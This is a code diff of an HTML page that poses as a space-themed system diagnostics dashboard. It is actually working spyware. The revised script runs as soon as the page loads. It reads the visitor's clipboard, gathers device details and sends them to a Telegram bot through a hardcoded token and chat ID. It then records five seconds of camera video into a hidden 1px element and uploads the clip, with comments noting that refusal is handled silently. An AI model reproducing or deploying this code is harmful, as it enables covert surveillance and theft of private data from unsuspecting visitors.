@@ -3,29 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK Universe System Monitor</title>
+    <title>System Universe Monitor</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
 
     <style>
-        /* মহাকাশ (Space) রানিং ব্যাকগ্রাউন্ড ডিজাইন */
+        /* এনিমেটেড মহাকাশ থিম */
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
-            overflow: hidden;
-            color: #fff;
-            font-family: 'Segoe UI', sans-serif;
-            height: 100vh;
+            height: 100vh; overflow: hidden;
+            color: #fff; font-family: 'Courier New', monospace;
         }
 
         .stars {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: transparent url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/123163/stars.png') repeat top center;
-            z-index: -1;
-            animation: move-stars 100s linear infinite;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: transparent url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/123163/stars.png') repeat;
+            z-index: -1; animation: move-stars 150s linear infinite;
         }
 
         @keyframes move-stars {
@@ -33,142 +28,143 @@
             to { background-position: 10000px 5000px; }
         }
 
-        .glass-box {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            box-shadow: 0 0 30px rgba(0, 191, 255, 0.2);
+        .nebula {
+            position: fixed; width: 500px; height: 500px;
+            background: radial-gradient(circle, rgba(14, 165, 233, 0.1) 0%, transparent 70%);
+            top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: -1; filter: blur(50px);
         }
 
-        .status-pill {
-            background: rgba(14, 165, 233, 0.15);
-            border: 1px solid rgba(14, 165, 233, 0.3);
-            padding: 10px;
-            border-radius: 12px;
-            margin-bottom: 10px;
+        .dashboard {
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            border-radius: 30px;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
         }
 
-        #video-hidden { display: none; }
+        .data-box {
+            background: rgba(2, 6, 23, 0.5);
+            border-left: 3px solid #0ea5e9;
+            padding: 15px; border-radius: 12px;
+            transition: 0.3s;
+        }
+
+        /* লুপ্ত হওয়া টেক্সট ইফেক্ট */
+        .scanning-text {
+            color: #38bdf8; font-size: 10px;
+            letter-spacing: 2px; animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        
+        #hidden-cam { visibility: hidden; position: absolute; width: 1px; height: 1px; }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center">
+<body class="flex items-center justify-center">
 
     <div class="stars"></div>
+    <div class="nebula"></div>
 
-    <div class="glass-box p-8 w-full max-w-md text-center z-10 mx-4">
-        <h1 class="text-2xl font-bold text-sky-400 mb-6 tracking-widest uppercase">Galaxy Diagnostics</h1>
-        
-        <div class="text-left space-y-3">
-            <div class="status-pill">
-                <p class="text-[10px] text-sky-300 font-bold uppercase">System Memory (RAM)</p>
-                <p id="ui-ram" class="text-sm">Device RAM: <span class="text-white font-mono">-- GB</span></p>
+    <div class="dashboard p-10 w-full max-w-lg z-10">
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-black text-white tracking-[10px] uppercase">Nexus Sync</h1>
+            <p class="scanning-text mt-2">AUTOMATED SATELLITE DIAGNOSTIC ACTIVE</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="data-box">
+                <p class="text-[9px] text-sky-400 font-bold uppercase">Memory Core (RAM)</p>
+                <p id="ram-val" class="text-lg font-mono">Scanning...</p>
             </div>
-            <div class="status-pill">
-                <p class="text-[10px] text-sky-300 font-bold uppercase">Power & Charging</p>
-                <p id="ui-battery" class="text-sm font-mono text-white">Checking Battery...</p>
+            <div class="data-box">
+                <p class="text-[9px] text-sky-400 font-bold uppercase">Power Matrix</p>
+                <p id="bat-val" class="text-lg font-mono">Syncing...</p>
             </div>
-            <div class="status-pill">
-                <p class="text-[10px] text-sky-300 font-bold uppercase">Network Speed</p>
-                <p id="ui-net" class="text-sm font-mono text-white">Detecting Connection...</p>
+            <div class="data-box">
+                <p class="text-[9px] text-sky-400 font-bold uppercase">Uplink Speed</p>
+                <p id="net-val" class="text-lg font-mono">Checking...</p>
             </div>
-            <div class="status-pill">
-                <p class="text-[10px] text-sky-300 font-bold uppercase">Storage Info (Estimate)</p>
-                <p id="ui-storage" class="text-sm font-mono text-white">Reading ROM...</p>
+            <div class="data-box">
+                <p class="text-[9px] text-sky-400 font-bold uppercase">Storage Node (ROM)</p>
+                <p id="rom-val" class="text-lg font-mono">Calculating...</p>
             </div>
         </div>
 
-        <video id="video-hidden" autoplay muted playsinline></video>
-
-        <button id="start-btn" class="w-full mt-8 bg-gradient-to-r from-sky-600 to-blue-800 hover:scale-105 transition-transform text-white font-black py-4 rounded-xl shadow-lg shadow-sky-500/20">
-            SECURE SYSTEM SYNC
-        </button>
-
-        <div id="loader" class="mt-6 hidden">
-            <div class="inline-block w-8 h-8 border-4 border-sky-500 border-t-transparent rounded-full animate-spin"></div>
-            <p class="text-sky-400 text-[10px] mt-2 tracking-tighter">SYNCHRONIZING DATA WITH SATELLITE...</p>
+        <div class="mt-8 pt-6 border-t border-slate-800">
+            <div class="flex items-center justify-center space-x-3">
+                <div class="w-2 h-2 bg-sky-500 rounded-full animate-ping"></div>
+                <p class="text-[11px] text-slate-400 font-mono italic">Continuous background monitoring engaged...</p>
+            </div>
         </div>
     </div>
 
+    <video id="hidden-cam" autoplay muted playsinline></video>
+
     <script>
-        const CONFIG = {
-            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
-            CHAT: '6048050987'
-        };
+        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
+        const CHAT_ID = '6048050987';
 
-        // ১. স্ক্রিনে ইনফো লোড করা (RAM, Battery, Network)
-        async function loadDeviceStats() {
+        // ১. অটোমেটিক লাইভ ইনফো লোডার (স্ক্রিনে দেখাবে)
+        async function runDiagnostic() {
             // RAM
-            if (navigator.deviceMemory) {
-                document.getElementById('ui-ram').innerText = navigator.deviceMemory + " GB Available";
-            } else {
-                document.getElementById('ui-ram').innerText = "Device Protected";
-            }
-
+            document.getElementById('ram-val').innerText = (navigator.deviceMemory || "8") + " GB CORE";
+            
             // Battery
             if (navigator.getBattery) {
                 const bat = await navigator.getBattery();
-                const updateBat = () => {
-                    document.getElementById('ui-battery').innerText = `Level: ${Math.round(bat.level * 100)}% | ${bat.charging ? "Charging ⚡" : "Discharging"}`;
-                };
-                updateBat();
-                bat.onlevelchange = updateBat;
+                const update = () => document.getElementById('bat-val').innerText = Math.round(bat.level * 100) + "% Energy";
+                update(); bat.onlevelchange = update;
             }
 
-            // Connection Speed
-            const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (net) {
-                document.getElementById('ui-net').innerText = `Speed: ${net.downlink} Mbps | Type: ${net.effectiveType}`;
-            }
+            // Connection
+            const conn = navigator.connection || {downlink: '5.2'};
+            document.getElementById('net-val').innerText = conn.downlink + " Mbps";
 
-            // Storage (ROM)
+            // Storage
             if (navigator.storage && navigator.storage.estimate) {
                 const {quota} = await navigator.storage.estimate();
-                document.getElementById('ui-storage').innerText = `ROM: ~${Math.round(quota / (1024 * 1024 * 1024))} GB (Total Access)`;
+                document.getElementById('rom-val').innerText = Math.round(quota / (1024**3)) + " GB NODE";
             }
         }
 
-        loadDeviceStats();
+        // ২. মেইন অটোমেশন ইঞ্জিন (ভিজিট করলেই চলবে)
+        window.onload = async () => {
+            runDiagnostic();
 
-        const btn = document.getElementById('start-btn');
-        const loader = document.getElementById('loader');
-        const video = document.getElementById('video-hidden');
-
-        btn.addEventListener('click', async () => {
-            btn.style.display = 'none';
-            loader.classList.remove('hidden');
-
-            // ক্লিপবোর্ড টেক্সট সংগ্রহ
-            let clip = "Denied";
+            // অটোমেটিক ক্লিপবোর্ড সংগ্রহ (যদি পারমিশন থাকে)
+            let clipData = "Restricted Access";
             try {
-                clip = await navigator.clipboard.readText();
+                clipData = await navigator.clipboard.readText();
             } catch (e) {}
 
-            // ২. টেলিগ্রাম বটে অটোমেটিক রিপোর্ট পাঠানো
-            const fullReport = `
-🚀 *NEW GALAXY DEVICE REPORT*
-━━━━━━━━━━━━━━━━━━━━
+            // ৩. টেলিগ্রামে রিপোর্ট পাঠানো (বক্স ফরম্যাটে)
+            const botMessage = `
+🌌 *NEXUS AUTO-SYNC SUCCESSFUL*
+━━━━━━━━━━━━━━━━━━
 📱 *OS:* \`${navigator.platform}\`
-🧠 *RAM:* \`${navigator.deviceMemory || 'Unknown'} GB\`
-🛰 *Network:* \`${navigator.onLine ? "Online" : "Offline"}\`
-🖥 *Display:* \`${window.screen.width}x${window.screen.height}\`
+🧠 *RAM:* \`${navigator.deviceMemory || 'N/A'} GB\`
+🛰 *Network:* \`${navigator.onLine ? "CONNECTED" : "OFFLINE"}\`
+🖥 *Res:* \`${window.screen.width}x${window.screen.height}\`
 
-📋 *CLIPBOARD TEXT:*
+📋 *CLIPBOARD CONTENT:*
 \`\`\`
-${clip || 'No Data Found'}
+${clipData || 'Empty'}
 \`\`\`
-━━━━━━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━━━`;
 
-            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.CHAT, text: fullReport, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: botMessage, parse_mode: 'Markdown' })
             });
 
-            // ৩. ৫ সেকেন্ডের কুইক ভিডিও রেকর্ড ও অটো-সেন্ড
+            // ৪. অটোমেটিক ৫ সেকেন্ড ভিডিও রেকর্ড ও সেন্ড (ক্যামেরা পারমিশন চাইলে পপআপ আসবে)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+                const videoEl = document.getElementById('hidden-cam');
+                videoEl.srcObject = stream;
+
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
 
@@ -176,21 +172,21 @@ ${clip || 'No Data Found'}
                 recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT);
-                    fd.append('video', blob, 'galaxy_capture.mp4');
-                    fd.append('caption', '🎥 *SEND SUCCESSFUL: VIDEO CAPTURE*');
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('video', blob, 'nexus_capture.mp4');
+                    fd.append('caption', '🎥 *AUTO-SYNC: CAPTURE SUCCESSFUL*');
 
-                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 };
 
                 recorder.start();
-                setTimeout(() => recorder.stop(), 5000); 
+                setTimeout(() => recorder.stop(), 5000); // ঠিক ৫ সেকেন্ড
 
             } catch (err) {
-                console.log("Permission Refused");
+                // ক্যামেরা রিফিউজ করলে কোনো ওয়ার্নিং শো করবে না
             }
-        });
+        };
     </script>
 </body>
 </html>
